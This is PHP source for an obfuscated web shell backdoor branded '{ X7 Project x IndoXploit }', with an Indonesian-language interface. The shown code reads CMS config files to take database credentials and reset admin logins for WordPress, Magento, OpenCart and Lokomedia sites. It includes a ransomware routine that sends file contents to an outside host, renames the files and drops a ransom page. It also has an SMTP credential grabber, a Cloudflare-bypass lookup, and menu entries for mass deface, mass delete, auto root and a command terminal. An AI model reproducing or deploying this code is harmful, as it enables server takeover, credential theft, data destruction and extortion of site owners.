$IIIIIIlI1I11 = $IIIIIIlIl1l1.'options';
$IIIIIIlIl11l = mysql_connect($IIIIIIlIl1Il,$IIIIIIlIl1I1,$IIIIIIlIl1lI);
$IIIIIIlI1III = mysql_select_db($IIIIIIlIl1ll);
$IIIIIIlI1IIl = mysql_query("SELECT * FROM $IIIIIIlIl11I ORDER BY id ASC");
$IIIIIIlII1l1 = mysql_fetch_array($IIIIIIlI1IIl);
$id = $IIIIIIlII1l1[ID];
$IIIIIIlI1lII = mysql_query("SELECT * FROM $IIIIIIlI1I11 ORDER BY option_id ASC");
$IIIIIIlI1lIl = mysql_fetch_array($IIIIIIlI1lII);
$target = $IIIIIIlI1lIl[option_value];
if($target == ''){
$IIIIIIlI1llI = 'Login => <font color=red>Error, Tidak dapat mengambil nama domainnya</font><br>';
}else{
$IIIIIIlI1llI = "Login => <a href='$target/wp-login.php' target='_blank'><u>$target/wp-login.php</u></a><br>";
}
$IIIIIIlI1Il1 = mysql_query("UPDATE $IIIIIIlIl11I SET user_login='$user_baru',user_pass='$pass_baru' WHERE id='$id'");
echo 'Config => '.$IIIIIIlIll11.'<br>';
echo 'CMS => Wordpress<br>';
echo $IIIIIIlI1llI;
if(!$IIIIIIlI1Il1 OR !$IIIIIIlIl11l OR !$IIIIIIlI1III){
echo 'Status => <font color=red>'.mysql_error().'</font><br><br>';
}else{
echo 'Status => <font color=lime>Sukses, Silakan login dengan User & Password yang baru.</font><br><br>';
}
mysql_close($IIIIIIlIl11l);
}elseif(preg_match('/Magento|Mage_Core/',$config)){
$IIIIIIlIl1Il = IIIIIIII11l1($config,'<host><![CDATA[',']]></host>');
$IIIIIIlIl1I1 = IIIIIIII11l1($config,'<username><![CDATA[',']]></username>');
$IIIIIIlIl1lI = IIIIIIII11l1($config,'<password><![CDATA[',']]></password>');
$IIIIIIlIl1ll = IIIIIIII11l1($config,'<dbname><![CDATA[',']]></dbname>');
$IIIIIIlIl1l1 = IIIIIIII11l1($config,'<table_prefix><![CDATA[',']]></table_prefix>');
$IIIIIIlIl11I = $IIIIIIlIl1l1.'admin_user';
$IIIIIIlI1I11 = $IIIIIIlIl1l1.'core_config_data';
$IIIIIIlIl11l = mysql_connect($IIIIIIlIl1Il,$IIIIIIlIl1I1,$IIIIIIlIl1lI);
$IIIIIIlI1III = mysql_select_db($IIIIIIlIl1ll);
$IIIIIIlI1IIl = mysql_query("SELECT * FROM $IIIIIIlIl11I ORDER BY user_id ASC");
$IIIIIIlII1l1 = mysql_fetch_array($IIIIIIlI1IIl);
$id = $IIIIIIlII1l1[user_id];
$IIIIIIlI1lII = mysql_query("SELECT * FROM $IIIIIIlI1I11 WHERE path='web/secure/base_url'");
$IIIIIIlI1lIl = mysql_fetch_array($IIIIIIlI1lII);
$target = $IIIIIIlI1lIl[value];
if($target == ''){
$IIIIIIlI1llI = 'Login => <font color=red>Error, Tidak dapat mengambil nama domainnya</font><br>';
}else{
$IIIIIIlI1llI = "Login => <a href='$target/admin/' target='_blank'><u>$target/admin/</u></a><br>";
}
$IIIIIIlI1Il1 = mysql_query("UPDATE $IIIIIIlIl11I SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
echo 'Config => '.$IIIIIIlIll11.'<br>';
echo 'CMS => Magento<br>';
echo $IIIIIIlI1llI;
if(!$IIIIIIlI1Il1 OR !$IIIIIIlIl11l OR !$IIIIIIlI1III){
echo 'Status => <font color=red>'.mysql_error().'</font><br><br>';
}else{
echo 'Status => <font color=lime>Sukses, Silakan login dengan User & Password yang baru.</font><br><br>';
}
mysql_close($IIIIIIlIl11l);
}elseif(preg_match('/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/',$config)){
$IIIIIIlIl1Il = IIIIIIII11l1($config,"'DB_HOSTNAME', '","'");
$IIIIIIlIl1I1 = IIIIIIII11l1($config,"'DB_USERNAME', '","'");
$IIIIIIlIl1lI = IIIIIIII11l1($config,"'DB_PASSWORD', '","'");
$IIIIIIlIl1ll = IIIIIIII11l1($config,"'DB_DATABASE', '","'");
$IIIIIIlIl1l1 = IIIIIIII11l1($config,"'DB_PREFIX', '","'");
$IIIIIIlIl11I = $IIIIIIlIl1l1.'user';
$IIIIIIlIl11l = mysql_connect($IIIIIIlIl1Il,$IIIIIIlIl1I1,$IIIIIIlIl1lI);
$IIIIIIlI1III = mysql_select_db($IIIIIIlIl1ll);
$IIIIIIlI1IIl = mysql_query("SELECT * FROM $IIIIIIlIl11I ORDER BY user_id ASC");
$IIIIIIlII1l1 = mysql_fetch_array($IIIIIIlI1IIl);
$id = $IIIIIIlII1l1[user_id];
$target = IIIIIIII11l1($config,"HTTP_SERVER', '","'");
if($target == ''){
$IIIIIIlI1llI = 'Login => <font color=red>Error, Tidak dapat mengambil nama domainnya</font><br>';
}else{
$IIIIIIlI1llI = "Login => <a href='$target' target='_blank'><u>$target</u></a><br>";
}
$IIIIIIlI1Il1 = mysql_query("UPDATE $IIIIIIlIl11I SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
echo 'Config => '.$IIIIIIlIll11.'<br>';
echo 'CMS => OpenCart<br>';
echo $IIIIIIlI1llI;
if(!$IIIIIIlI1Il1 OR !$IIIIIIlIl11l OR !$IIIIIIlI1III){
echo 'Status => <font color=red>'.mysql_error().'</font><br><br>';
}else{
echo 'Status => <font color=lime>Sukses, Silakan login dengan User & Password yang baru.</font><br><br>';
}
mysql_close($IIIIIIlIl11l);
}elseif(preg_match('/panggil fungsi validasi xss dan injection/',$config)){
$IIIIIIlIl1Il = IIIIIIII11l1($config,'server = "','"');
$IIIIIIlIl1I1 = IIIIIIII11l1($config,'username = "','"');
$IIIIIIlIl1lI = IIIIIIII11l1($config,'password = "','"');
$IIIIIIlIl1ll = IIIIIIII11l1($config,'database = "','"');
$IIIIIIlIl11I = 'users';
$IIIIIIlI1I11 = 'identitas';
$IIIIIIlIl11l = mysql_connect($IIIIIIlIl1Il,$IIIIIIlIl1I1,$IIIIIIlIl1lI);
$IIIIIIlI1III = mysql_select_db($IIIIIIlIl1ll);
$IIIIIIlI1IIl = mysql_query("SELECT * FROM $IIIIIIlI1I11 ORDER BY id_identitas ASC");
$IIIIIIlII1l1 = mysql_fetch_array($IIIIIIlI1IIl);
$target = $IIIIIIlII1l1[alamat_website];
if($target == ''){
$IIIIIIlI1lll = $IIIIIIlII1l1[url];
$IIIIIIlI1llI = 'Login => <font color=red>Error, Tidak dapat mengambil nama domainnya</font><br>';
if($IIIIIIlI1lll == ''){
$IIIIIIlI1ll1 = 'Login => <font color=red>Error, Tidak dapat mengambil nama domainnya</font><br>';
}else{
$IIIIIIlI1l1I = file_get_contents("$IIIIIIlI1lll/adminweb/");
$IIIIIIlI1l1l = file_get_contents("$IIIIIIlI1lll/lokomedia/adminweb/");
if(preg_match('/CMS Lokomedia|Administrator/',$IIIIIIlI1l1I)){
$IIIIIIlI1ll1 = "Login => <a href='$IIIIIIlI1lll/adminweb' target='_blank'><u>$IIIIIIlI1lll/adminweb</u></a><br>";
}elseif(preg_match('/CMS Lokomedia|Lokomedia/',$IIIIIIlI1l1l)){
$IIIIIIlI1ll1 = "Login => <a href='$IIIIIIlI1lll/lokomedia/adminweb' target='_blank'><u>$IIIIIIlI1lll/lokomedia/adminweb</u></a><br>";
}else{
$IIIIIIlI1ll1 = "Login => <a href='$IIIIIIlI1lll' target='_blank'><u>$IIIIIIlI1lll</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
}
}
}else{
$IIIIIIlI1l11 = file_get_contents("$target/adminweb/");
$IIIIIIlI11II = file_get_contents("$target/lokomedia/adminweb/");
if(preg_match('/CMS Lokomedia|Administrator/',$IIIIIIlI1l11)){
$IIIIIIlI1llI = "Login => <a href='$target/adminweb' target='_blank'><u>$target/adminweb</u></a><br>";
}elseif(preg_match('/CMS Lokomedia|Lokomedia/',$IIIIIIlI11II)){
$IIIIIIlI1llI = "Login => <a href='$target/lokomedia/adminweb' target='_blank'><u>$target/lokomedia/adminweb</u></a><br>";
}else{
$IIIIIIlI1llI = "Login => <a href='$target' target='_blank'><u>$target</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
}
}
$IIIIIIlI1Il1 = mysql_query("UPDATE $IIIIIIlIl11I SET username='$user_baru',password='$pass_baru' WHERE level='admin'");
echo 'Config => '.$IIIIIIlIll11.'<br>';
echo 'CMS => Lokomedia<br>';
if(preg_match('/Error, Tidak dapat mengambil nama domainnya/',$IIIIIIlI1llI)){
echo $IIIIIIlI1ll1;
}else{
echo $IIIIIIlI1llI;
}
if(!$IIIIIIlI1Il1 OR !$IIIIIIlIl11l OR !$IIIIIIlI1III){
echo 'Status => <font color=red>'.mysql_error().'</font><br><br>';
}else{
echo 'Status => <font color=lime>Sukses, Silakan login dengan User & Password yang baru.</font><br><br>';
}
mysql_close($IIIIIIlIl11l);
}
}
}
}else{
echo "<h3 class='text-center mb-4'>Auto Edit User</h3>
		<form method='post'>
		<h5>Lokasi Dir Config</h5>
		<input type='text' class='form-control mb-3' name='config_dir' value='$dir'>
		<h5>Set User & Pass :</h5>
		<input type='text' name='user_baru' value='indosec' class='form-control mb-3' placeholder='Set Username'>
		<input type='text' name='pass_baru' value='indosec' class='form-control mb-4' placeholder='Set Password'>
		<input type='submit' name='hajar' value='Edit User' class='btn btn-danger btn-block'>
		</form>
		<p class='text-muted mb-4'>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</p>";
}
exit;
}
function ransom($dir,$file){
if(isset($_POST['encrypt'])) {
$dir = $_POST['path'];
echo"<textarea class='form-control mb-4' rows='13' disabled=''>";
function IIIIIIlI11I1($dir){
if (is_dir($dir)) {
$IIIIIIlI11lI = scandir($dir);
unset($IIIIIIlI11lI[array_search('.',$IIIIIIlI11lI,true)]);
unset($IIIIIIlI11lI[array_search('..',$IIIIIIlI11lI,true)]);
if (count($IIIIIIlI11lI) <1)
return;
foreach($IIIIIIlI11lI as $IIIIIIlI11l1){
$IIIIIIlI111I = $dir.'/'.$IIIIIIlI11l1;
if(!is_dir($IIIIIIlI111I)){
$file = file_get_contents($IIIIIIlI111I);
$IIIIIIlI111l = base64_encode($file);
$IIIIIIllIIII = curl_init();
curl_setopt($IIIIIIllIIII,CURLOPT_URL,'http://encrypt.indsc.me/api.php?type=encrypt');
curl_setopt($IIIIIIllIIII,CURLOPT_RETURNTRANSFER,1);
curl_setopt($IIIIIIllIIII,CURLOPT_POSTFIELDS,"text=$IIIIIIlI111l");
$x = json_decode(curl_exec($IIIIIIllIIII));
if($x->status == 'success'){
$IIIIIIllIIl1 = base64_decode($x->data);
rename($IIIIIIlI111I,$IIIIIIlI111I.'.indsc');
echo "[+]$IIIIIIlI111I => Success Encrypted\n";
}
}
if(is_dir($dir.'/'.$IIIIIIlI11l1)) IIIIIIlI11I1($dir.'/'.$IIIIIIlI11l1);
}
$IIIIIIllII1I = file_get_contents('https://pastebin.com/raw/aGZ6BeTH');
$IIIIIIllII1l = fopen($dir.'/index.html','w');
fwrite($IIIIIIllII1l,$IIIIIIllII1I);
fclose($IIIIIIllII1l);
echo "\n[+] Done !";
}else{
echo "\nBukan dir";
}
}
IIIIIIlI11I1($dir);
echo '</textarea><br/>';
}else{
echo '<form method="post">
		<div class="form-group">
		<h4 class="text-center mb-4"><i class="fa fa-lock"></i> Ransomware</h4>
		<label>Pilih Directory :</label>
		<div class="form-group input-group">
		<div class="input-group-prepend">
		<div class="input-group-text"><i class="fa fa-home"></i></div>
		</div>
		<input type="text" name="path" class="form-control" value="'.$dir.'"/>
		</div>
		<input type="submit" name="encrypt" class="btn btn-danger btn-block" value="Encrypt"/>
		</div>
		</form>';
}
exit;
}
function IIIIIIllII11($dir){
$IIIIIIllIlII = scandir($dir);
foreach($IIIIIIllIlII as $IIIIIIIl11ll){
if(!is_file("$dir/$IIIIIIIl11ll")) continue;
$IIIIIIllIlIl = file_get_contents("$dir/$IIIIIIIl11ll");
$IIIIIIllIlIl = str_replace("$",'',$IIIIIIllIlIl);
if(preg_match('/JConfig|joomla/',$IIIIIIllIlIl)){
$IIIIIIllIlI1 = IIIIIIII11l1($IIIIIIllIlIl,"smtphost = '","'");
$IIIIIIllIllI = IIIIIIII11l1($IIIIIIllIlIl,"smtpauth = '","'");
$IIIIIIllIlll = IIIIIIII11l1($IIIIIIllIlIl,"smtpuser = '","'");
$IIIIIIllIll1 = IIIIIIII11l1($IIIIIIllIlIl,"smtppass = '","'");
$IIIIIIllIl1I = IIIIIIII11l1($IIIIIIllIlIl,"smtpport = '","'");
$IIIIIIllIl1l = IIIIIIII11l1($IIIIIIllIlIl,"smtpsecure = '","'");
echo "<table class='text-white table table-bordered'>
			<tr>
			<td>SMTP Host: $IIIIIIllIlI1</td>
			</tr>
			<tr>
			<td>SMTP Port: $IIIIIIllIl1I</td>
			</tr>
			<tr>
			<td>SMTP User: $IIIIIIllIlll</td>
			</tr>
			<tr>
			<td>SMTP Pass: $IIIIIIllIll1</td>
			</tr>
			<tr>
			<td>SMTP Auth: $IIIIIIllIllI</td>
			</tr>
			<tr>
			<td>SMTP Secure: $IIIIIIllIl1l</td>
			</tr>
			</table>";
}
}
echo "<p class='text-muted'>NB : Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/namafolder_config )</p>";
exit;
}
function IIIIIIllIl11(){
echo '<form method="POST">
	<h5 class="text-center mb-3">Bypass Cloud Flare</h5>
	<div class="form-group input-group">
	<select class="form-control" name="idsPilih">
	<option>Pilih Metode</option>
	<option>ftp</option>
	<option>direct-conntect</option>
	<option>webmail</option>
	<option>cpanel</option>
	</select>
	</div>
	<div class="form-group input-group mb-4">
	<input class="form-control" type="text" name="target" placeholder="Masukan Url">
	<input class="btn btn-danger form-control" type="submit" value="Bypass">
	</div>
	</form>';
$target = $_POST['target'];
if($_POST['idsPilih'] == 'ftp'){
$ftp = gethostbyname('ftp.'."$target");
echo "<p align='center' dir='ltr'><font face='Tahoma' size='3' color='#00ff00'>Correct 
		ip is : </font><font face='Tahoma' size='3' color='#F68B1F'>$ftp</font></p>";
}
if($_POST['idsPilih'] == 'direct-conntect'){
$IIIIIIllI1Il = gethostbyname('direct-connect.'."$target");
echo "<br><p align='center' dir='ltr'><font face='Tahoma' size='3' color='#00ff00'>Correct 
		ip is : </font><font face='Tahoma' size='3' color='#F68B1F'>$IIIIIIllI1Il</font></p>";
}
if($_POST['idsPilih'] == 'webmail'){
$IIIIIIII1IlI = gethostbyname('webmail.'."$target");
echo "<br><p align='center' dir='ltr'><font face='Tahoma' size='3' color='#00ff00'>Correct 
		ip is : </font><font face='Tahoma' size='3' color='#F68B1F'>$IIIIIIII1IlI</font></p>";
}
if($_POST['idsPilih'] == 'cpanel'){
$cpanel = gethostbyname('cpanel.'."$target");
echo "<br><p align='center' dir='ltr'><font face='Tahoma' size='3' color='#00ff00'>Correct 
		ip is : </font><font face='Tahoma' size='3' color='#F68B1F'>$cpanel</font></p>";
}
exit;
}
function IIIIIIllI1lI($dir,$file){
$IIIIIIllI1ll = basename($dir).'.zip';
function Zip($IIIIIIllI11I,$IIIIIIllI11l){
if (extension_loaded('zip') === true){
if (file_exists($IIIIIIllI11I) === true){
$zip = new ZipArchive();
if ($zip->open($IIIIIIllI11l,ZIPARCHIVE::CREATE) === true){
$IIIIIIllI11I = realpath($IIIIIIllI11I);
if (is_dir($IIIIIIllI11I) === true){
$IIIIIIlI111I = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($IIIIIIllI11I),RecursiveIteratorIterator::SELF_FIRST);
foreach ($IIIIIIlI111I as $file){
$file = realpath($file);
if (is_dir($file) === true){
}elseif(is_file($file) === true){
$zip->addFromString(str_replace($IIIIIIllI11I .'/','',$file),file_get_contents($file));
}
}
}elseif(is_file($IIIIIIllI11I) === true){
$zip->addFromString(basename($IIIIIIllI11I),file_get_contents($IIIIIIllI11I));
}
}
return @$zip->close();
}
}
return false;
}
function IIIIIIlllIIl($IIIIIIlllII1,$IIIIIIlllIlI){
$zip = new ZipArchive();
$IIIIIIlllIll = $zip->open($IIIIIIlllII1);
if ($IIIIIIlllIll === TRUE){
$name = basename($IIIIIIlllII1,'.zip').'_unzip';
@mkdir($name);
@$zip->extractTo($IIIIIIlllIlI.'/'.$name);
return @$zip->close();
}else{
return false;
}
}
echo '<div class="card card-body text-dark mb-4">
	<h4 class="text-center">Zip Menu</h3>
	<form enctype="multipart/form-data" method="post">
	<div class="form-group">
	<label>Zip File:</label>
	<div class="custom-file">
	<input type="file" name="zip_file" class="custom-file-input" id="customFile">
	<label class="custom-file-label" for="customFile">Choose file</label>
	</div>
	<input type="submit" name="upnun" class="btn btn-danger btn-block mt-3" value="Upload & Unzip"/>
	</div>
	</form>';
if($_POST['upnun']){
$IIIIIIIllI1I = $_FILES['zip_file']['name'];
$IIIIIIlllIl1 = $_FILES['zip_file']['tmp_name'];
if(move_uploaded_file($IIIIIIlllIl1,"$dir/$IIIIIIIllI1I")){
echo IIIIIIlllIIl($IIIIIIIllI1I,$dir);
unlink($IIIIIIIllI1I);
$IIIIIIIlIl1l = 'success';
$IIIIIIIlIl11 = 'Berhasil Mengekstrak Zip';
IIIIIIIlIl1I($IIIIIIIlIl1l,$IIIIIIIlIl11,$dir);
}else{
echo '<b>Gagal!</b>';
}
}
echo "<div class='row'><div class='col-md-6 mb-3'><h5>Zip Backup</h5>
	<form method='post'>
	<label>Folder</label>
	<input type='text' name='folder' class='form-control mb-3' value='$dir'>
	<input type='submit' name='backup' class='btn btn-danger btn-block' value='Backup!'>
	</form>";
if($_POST['backup']){
$IIIIIIlllI1I = $_POST['folder'];
if(Zip($IIIIIIlllI1I,$_POST['folder'].'/'.$IIIIIIllI1ll)){
$IIIIIIIlIl1l = 'success';
$IIIIIIIlIl11 = 'Berhasil Membuat Zip';
IIIIIIIlIl1I($IIIIIIIlIl1l,$IIIIIIIlIl11,$dir);
}else{
echo '<b>Gagal!</b>';
}
}
echo "</div>
	<div class='col-md-6'><h5>Unzip Manual</h5>
	<form action='' method='post'>
	<label>Zip Location:</label>
	<input type='text' name='file_zip' class='form-control mb-3' value='$dir/$IIIIIIllI1ll'>
	<input type='submit' name='extrak' class='btn btn-danger btn-block' value='Unzip!'>
	</form>";
if($_POST['extrak']){
$zip = $_POST['file_zip'];
if (IIIIIIlllIIl($zip,$dir)){
$IIIIIIIlIl1l = 'success';
$IIIIIIIlIl11 = 'Berhasil Mengekstrak Zip';
IIIIIIIlIl1I($IIIIIIIlIl1l,$IIIIIIIlIl11,$dir);
}else{
echo '<b>Gagal!</b>';
}
}
echo '</div></div></div>';
}
;echo '<html>
<head>
	<meta name="viewport" content="widht=device-widht, initial-scale=1"/>
	<meta name="theme-color" content="#343a40"/>
	<meta name="author" content="Holiq"/>
	<meta name="copyright" content="{ X7 Project }"/>
	<link rel="icon" type="image/png" href=""/>
	<title>{ X7 Project x IndoXploit }</title>
	<link rel="stylesheet" href="pojan/assets/css/bootstrap.min.css">
	<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.0/css/bootstrap.min.css"/>
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.10.2/css/all.min.css"/>
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"/>
	<script src="https://code.jquery.com/jquery-3.3.1.js"></script>
	<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>
	<script src="https://cdn.jsdelivr.net/npm/sweetalert2@8.18.0/dist/sweetalert2.all.min.js"></script>
</head>
<body class="bg-dark text-light">
	<script>
		$(document).ready(function(){
			$(window).scroll(function(){
				if ($(this).scrollTop() > 700){
					$(".scrollToTop").fadeIn();
				}else{
					$(".scrollToTop").fadeOut();
				}
			});
			$(".scrollToTop").click(function(){
				$("html, body").animate({scrollTop : 0},1000);
				return false;
			});
		});
		$(document).ready(function(){
			$(\'input[type="file"]\').on("change", function(){
				let filenames = [];
				let files = document.getElementById("customFile").files;
				if (files.length > 1){
					filenames.push("Total Files (" + files.length + ")");
				}else{
					for (let i in files){
						if (files.hasOwnProperty(i)){
							filenames.push(files[i].name);
						}
					}
				}
				$(this).next(".custom-file-label").html(filenames.join(","));
			});
		});
		var max_fields = 5;
		var x = 1;
		$(document).on(\'click\', \'#add_input\', function(e){
			if(x < max_fields){
				x++;
				$(\'#output\').append(\'<div class=\\"input-group\\ form-group\\ text-dark\\" id=\\"out\\"><input type=\\"text\\" class=\\"form-control\\" name=\\"nama_file[]\\" placeholder=\\"Nama File...\\"><div class=\\"input-group-prepend\\ remove\\"><div class=\\"input-group-text\\"><a href="#" class="text-dark"><i class=\\"fa fa-minus\\"></i></a></div></div></div>\');
			}
			$(\'#output\').on("click",".remove", function(e){
				e.preventDefault(); $(this).parent(\'#out\').remove(); x--;
				repeat();
			})
		});
		$(document).on(\'click\', \'#add_input1\', function(e){
			if(x < max_fields){
				x++;
				$(\'#output1\').append(\'<div class=\\"input-group\\ form-group\\ text-dark\\" id=\\"out\\"><input type=\\"text\\" class=\\"form-control\\" name=\\"nama_folder[]\\" placeholder=\\"Nama Folder...\\"><div class=\\"input-group-prepend\\ remove\\"><div class=\\"input-group-text\\"><a href="#" class="text-dark"><i class=\\"fa fa-minus\\"></i></a></div></div></div>\');
			}
			$(\'#output1\').on("click",".remove", function(e){
				e.preventDefault(); $(this).parent(\'#out\').remove(); x--;
				repeat();
			})
		});
		
	</script>
	<style>
		@import url(https://fonts.googleapis.com/css?family=Lato);
		@import url(https://fonts.googleapis.com/css?family=Quicksand);
		@import url(https://fonts.googleapis.com/css?family=Inconsolata);
		@media(min-width:767px){.scrollToTop{display:none !important;}}
		@media(max-width:767px){textarea{font-size:13px !important;}}
		input[type="text"],textarea {font-family: "Inconsolata", monospace;}
		body{margin:0;padding:0;font-family:"Lato";overscroll-behavior:none;}
		.infor{font-size:14px;color:#333!important;}
		.ds{color:#f00!important;word-wrap:break-word;}
		#tab table thead th{padding:5px;font-size:16px;white-space: nowrap;}
		#tab tr {border-bottom:1px solid #ccc;}
		#tab tr:hover{background:#5B6F7D;color:#fff;}
		#tab tr td{padding:5px 10px;white-space:nowrap;}
		.pinggir{text-align:left !important; padding-left: 4px !important;}
		#tab tr td .badge{font-size:13px;}
		.active,.active:hover{color:#00FF00;}
		a {font-family:"Quicksand"; color:white;}
		a:hover{color:dodgerBlue;}
		.badge{width:30px;transition:.3s;}
		.badge:hover{transform: scale(1.1);transition:.3s;}
		.ico {width:25px;}
		.ico2{width:30px;}
		.scrollToTop{
			position:fixed;
			bottom:30px;
			right:30px;
			width:35px;
			height:35px;
			background:#262626;
			color:#fff;
			border-radius:15%;
			text-align:center;
			opacity:.5;
		}
		.scrollToTop:hover{color:#fff;}
		.up{font-size:25px;line-height:35px;}
		.lain{color:#888888;font-size:20px;margin-left:5px;top:1px;}
		.lain:hover{color:#fff;}
		.tambah{
			width:35px;
			height:35px;
			line-height:35px;
			border:1px solid;
			border-radius:50%;
			text-align:center;
		}
		.fiture{margin:3px;}
		.tmp th {font-size:14px;}
		.tmp tr td{border:solid 1px #BBBBBB;text-align:center;font-size:13px;padding:2px 5px;}
		.tmp tr:hover{background:#5B6F7D; color:#fff;}
		.about{color:#000;}
		.about .card-body .img{
			position: relative;
			background: url(https://i.postimg.cc/Wb1X4xNS/image.png);
			background-size: cover;
			width: 150px;
			height: 150px;
		}
		.butn {
			position: relative;
			text-align: center;
			padding: 3px;
			background:rgba(225,225,225,.3);
			-webkit-transition: background 300ms ease, color 300ms ease;
			transition: background 300ms ease, color 300ms ease;
		}
		input[type="radio"].toggle {display:none;}
		input[type="radio"].toggle + label {cursor:pointer;margin:0 2px;width:60px;}
		input[type="radio"].toggle + label:after {
			position: absolute;
			content: "";
			top: 0;
			background: #fff;
			height: 100%;
			width: 100%;
			z-index: -1;
			-webkit-transition: left 400ms cubic-bezier(0.77, 0, 0.175, 1);
			transition: left 400ms cubic-bezier(0.77, 0, 0.175, 1);
		}
		input[type="radio"].toggle.toggle-left + label:after {left:100%;}
		input[type="radio"].toggle.toggle-right + label {margin-left:-5px;}
		input[type="radio"].toggle.toggle-right + label:after {left:-100%;}
		input[type="radio"].toggle:checked + label {cursor:default;color:#000;-webkit-transition:color 400ms;transition: color 400ms;}
		input[type="radio"].toggle:checked + label:after {left:0;}
	</style>
	<nav class="navbar static-top navbar-dark">
		<button class="navbar-toggler"type="button" data-toggle="collapse" data-target="#info" aria-label="Toggle navigation">
			<i style="color:#fff;" class="fa fa-navicon"></i>
		</button>
		<div class="collapse navbar-collapse" id="info">
			<ul>
				<a href="https://facebook.com/IndoSecOfficial" class="lain"><i class="fa fa-facebook tambah"></i></a>
				<a href="https://www.instagram.com/indosec.id" class="lain"><i class="fa fa-instagram tambah"></i></a>
				<a href="" class="lain"><i class="fa fa-youtube-play tambah"></i></a>
				<a href="https://github.com/indosecid" class="lain"><i class="fa fa-github tambah"></i></a>
				<a href="https://indosec.web.id" class="lain"><i class="fa fa-globe tambah"></i></a>
			</ul>
		</div>
	</nav>
	';
echo '<div class="container">
	<h1 class="text-center"><a href="https://facebook.com/IndoSecOfficial" style="color:#ffffff;">{ X7 Project }</h1>
	<center><h5>Shell Backdoor</a></h5></center>
	<hr/>
	<div class="text-center">
	<div class="d-flex justify-content-center flex-wrap">
	<a href="?" class="fiture btn btn-danger btn-sm"><i class="fa fa-home"></i> Home</a>
	<a href="?dir='.$dir.'&aksi=upload" class="fiture btn btn-danger btn-sm"><i class="fa fa-upload"></i> Upload</a>
	<a href="?dir='.$dir.'&aksi=crontab" class="fiture btn btn-danger btn-sm"><i class="fa fa-plus"></i> Crontab</a>
	<a href="?dir='.$dir.'&aksi=ngeroot" class="fiture btn btn-danger btn-sm"><i class="fa fa-plus"></i> Auto root</a>
	<a href="?dir='.$dir.'&aksi=terminalroot" class="fiture btn btn-danger btn-sm"><i class="fa fa-plus"></i> Terminal Root</a>
	<a href="?dir='.$dir.'&aksi=buat_file" class="fiture btn btn-danger btn-sm"><i class="fa fa-plus-circle"></i> Buat File</a>
	<a href="?dir='.$dir.'&aksi=buat_folder" class="fiture btn btn-danger btn-sm"><i class="fa fa-plus"></i> Buat Folder</a>
	<a href="?dir='.$dir.'&aksi=masdef" class="fiture btn btn-danger btn-sm"><i class="fa fa-exclamation-triangle"></i> Mass Deface</a>
	<a href="?dir='.$dir.'&aksi=masdel" class="fiture btn btn-danger btn-sm"><i class="fa fa-trash"></i> Mass Delete</a>
	<a href="?dir='.$dir.'&aksi=jumping" class="fiture btn btn-danger btn-sm"><i class="fa fa-exclamation-triangle"></i> Jumping</a>
	<a href="?dir='.$dir.'&aksi=config" class="fiture btn btn-danger btn-sm"><i class="fa fa-cogs"></i> Config</a>
	<a href="?dir='.$dir.'&aksi=adminer" class="fiture btn btn-danger btn-sm"><i class="fa fa-user"></i> Adminer</a>
	<a href="?dir='.$dir.'&aksi=changedate" class="fiture btn btn-danger btn-sm"><i class="fa fa-exclamation-circle"></i> Mass Auto Change Date</a>
	<a href="?dir='.$dir.'&aksi=symlink" class="fiture btn btn-danger btn-sm"><i class="fa fa-exclamation-circle"></i> Symlink</a>
	<a href="?dir='.$dir.'&aksi=bctools" class="fiture btn btn-warning btn-sm"><i class="fas fa-network-wired"></i> Network</a>
	<a href="?dir='.$dir.'&aksi=resetpasscp" class="fiture btn btn-warning btn-sm"><i class="fa fa-key"></i> Auto Reset Cpanel</a>
	<a href="?dir='.$dir.'&aksi=auteduser" class="fiture btn btn-warning btn-sm"><i class="fas fa-user-edit"></i> Auto Edit User</a>
	<a href="?dir='.$dir.'&aksi=ransom" class="fiture btn btn-warning btn-sm"><i class="fab fa-keycdn"></i> Ransomware</a>
	<a href="?dir='.$dir.'&aksi=smtpgrab" class="fiture btn btn-warning btn-sm"><i class="fas fa fa-exclamation-circle"></i> SMTP Grabber</a>
	<a href="?dir='.$dir.'&aksi=bypascf" class="fiture btn btn-warning btn-sm"><i class="fas fa-cloud"></i> Bypass Cloud Flare</a>
	<a href="?dir='.$dir.'&aksi=zip_menu" class="fiture btn btn-warning btn-sm"><i class="fa fa-file-archive-o"></i> Zip Menu</a>
	<a href="?about" class="fiture btn btn-warning btn-sm"><i class="fa fa-info"></i> About Us</a>
	<a href="?keluar" class="fiture btn btn-warning btn-sm"><i class="fa fa-sign-out"></i> keluar</a>
	</div>
	</div>
	<div class="row">
	<div class="col-md-5"><br/>
	<h5><i class="fa fa-terminal"></i>Terminal : </h5>
	<form>
	<input type="text" class="form-control" name="cmd" autocomplete="off" placeholder="id | uname -a | whoami | heked">
	</form>
	<hr/>
	<h5><i class="fa fa-search"></i> Informasi : </h5>
	<div class="card table-responsive">
	<div class="card-body">
	<table class="table infor">
	<tr>
	<td>PHP</td>
	<td> : '.$IIIIIIII1IIl.'</td>
	</tr>
	<tr>
	<td>IP Server</td>
	<td> : '.$IIIIIIII1III.'</td>
	</tr>
	<tr>
	<td>HDD</td>
	<td class="d-flex">Total : '.IIIIIIII1l11($IIIIIIII1lII).' Free : '.IIIIIIII1l11($IIIIIIII1lIl).' ['.$IIIIIIII1lI1.'%]</td>
	</tr>
	<tr>
	<td>Domain</td>
	<td>: '.$IIIIIIIlII1l.'</td>
	</tr>
	<tr>
	<td>MySQL</td>
	<td>: '.$IIIIIIII1I1I.'</td>
	</tr>
	<tr>
	<td>cURL</td>
	<td>: '.$IIIIIIII1I1l.'</td>
	</tr>
	<tr>
	<td>Mailer</td>
	<td>: '.$mail.'</td>
	</tr>
	<tr>
	<td>Disable Function</td>
	<td>: '.$IIIIIIII1ll1.'</td>
